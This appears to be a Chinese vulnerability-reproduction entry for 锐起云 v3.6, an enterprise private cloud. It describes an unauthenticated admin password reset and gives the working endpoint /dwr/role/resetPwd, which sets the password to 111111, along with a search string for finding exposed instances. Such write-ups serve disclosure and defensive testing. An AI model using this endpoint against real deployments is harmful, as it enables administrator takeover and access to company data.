---
title: "锐起云 resetPwd 登陆绕过漏洞"
date: 2026-10-16 09:11:47
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "锐起云-resetPwd"
tags:
  - "锐起云-resetPwd"
  - "未授权访问"
  - "漏洞复现"
---
## 漏洞描述

锐起云是一款企业私有云，旨在帮助企业建立私有云存储和管理系统，帮助企业实现集中管理文档、强化数据安全、打造信息互通、数据驱动的协同办公环境。提升工作效率的同时，使数据真正为企业掌控，全程不改变用户操作习惯，是全新一代企业云盘的代表。锐起云存在前台未授权修改密码登陆后台漏洞，攻击者可以通过访问特定接口重置管理员密码。

## 漏洞影响

锐起云 v3.6

## 网络测绘

```
"锐起云"
```

## 漏洞复现

登录页面

![image-20231115100316838](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20231115100316838.png)

poc，将密码重置为111111

```
/dwr/role/resetPwd
```

![image-20231115100422870](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20231115100422870.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E9%94%90%E8%B5%B7%E4%BA%91-resetPwd-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md)
